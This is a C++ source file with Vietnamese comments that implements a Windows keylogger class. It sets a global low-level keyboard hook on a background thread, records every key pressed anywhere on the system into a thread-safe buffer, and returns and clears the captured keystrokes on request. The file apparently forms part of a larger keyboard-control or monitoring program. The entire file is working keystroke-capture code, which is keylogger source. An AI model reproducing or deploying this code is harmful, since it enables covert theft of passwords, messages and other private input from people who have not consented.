#include "KeyboardController.h"
#ifdef _WIN32

// Khởi tạo các biến static
HHOOK Keylogger::_hook = NULL;
vector<std::string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop(); // Đảm bảo dừng thread khi hủy class
}

// --- PHẦN 1: Logic xử lý chuỗi ---
void Keylogger::append(const std::string& str) {
    // Thread-safe buffer access
    std::lock_guard<std::mutex> lock(_mtx); 
    _buffer.push_back(str);
}

// --- PHẦN 2: Hàm xử lý phím (Hook Procedure) ---
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Process valid keydown events only
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode; // Lấy mã phím ảo

        // Xử lý các phím đặc biệt để dễ đọc
        if (key == VK_BACK) append("[BACK]");
        else if (key == VK_RETURN) append("\n");
        else if (key == VK_SPACE) append(" ");
        else if (key == VK_TAB) append("[TAB]");
        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {}
        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
        else if (key == VK_ESCAPE) append("[ESC]");
        // Xử lý số và chữ cái
        else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
             // Chuyển mã ASCII sang ký tự
             append(std::string(1, (char)key));
        }
        else {
             // Các phím lạ thì ghi mã số
             append("[" + std::to_string(key) + "]");
        }
    }
    // Forward event to next hook (required for keyboard to work)
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// --- PHẦN 3: Quản lý luồng (Threading) ---
void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    // Tạo luồng riêng để lắng nghe
    _workerThread = std::thread([this]() {
        // Cài đặt Hook
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        // Vòng lặp tin nhắn (Message Loop)
        // Bắt buộc phải có để Hook hoạt động trên Windows
        MSG msg;
        while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break; // Nhận lệnh thoát thì dừng
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Dọn dẹp hook khi vòng lặp kết thúc
        if (_hook) {
            UnhookWindowsHookEx(_hook);
            _hook = NULL;
        }
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    // Gửi tin nhắn WM_QUIT vào luồng worker để đánh thức GetMessage và thoát vòng lặp
    if (_workerThread.joinable()) {
        PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
        _workerThread.join();
    }
}

// --- PHẦN 4: Lấy dữ liệu an toàn ---
vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx); // Khóa lại!
    
    if (_buffer.empty()) return {};
    
    vector<std::string> dataCopy = _buffer; // Copy dữ liệu ra
    _buffer.clear();                // Xóa dữ liệu gốc đi
    
    return dataCopy; // Trả về bản copy
} // Tự động mở khóa
#endif